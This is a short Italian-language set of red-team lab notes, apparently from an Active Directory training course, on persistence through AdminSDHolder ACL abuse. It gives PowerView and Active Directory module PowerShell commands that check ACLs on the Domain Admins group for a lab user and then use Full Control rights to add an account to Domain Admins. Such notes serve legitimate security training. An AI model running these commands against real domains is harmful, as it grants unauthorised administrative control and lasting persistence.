# Persistence using ACLs - Abusing - AdminSDHolder1

#### Check Domain Admins Permissions

* Controlla se i permessi da Domain Admins sono stati realmente aggiunti all'utente utilzzato negli step precedenti

{% code fullWidth="true" %}
```powershell
Get-DomainObjectAcl -Identity 'Domain Admins' -ResolveGUIDs | ForEach-Object {$_ | Add-Member
NoteProperty 'IdentityName' $(Convert-SidToName
$_.SecurityIdentifier);$_} | ?{$_.IdentityName -match
"student1"}
```
{% endcode %}

* Utilizzando il modulo Active Directory

{% code fullWidth="true" %}
```powershell
(Get-Acl -Path 'AD:\CN=Domain Admins,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local').Ac
cess | ?{$_.IdentityReference -match 'student1'}
```
{% endcode %}

#### Abusing Full Control Permissions

* Abusing dei permessi di Full Control utilizzando PowerView

```powershell
Add-DomainGroupMember -Identity 'Domain Admins' -Members testda -Verbose
```

* Utilizzando il modulo Active Directory

```powershell
Add-ADGroupMember -Identity 'Domain Admins' -Members testda
```
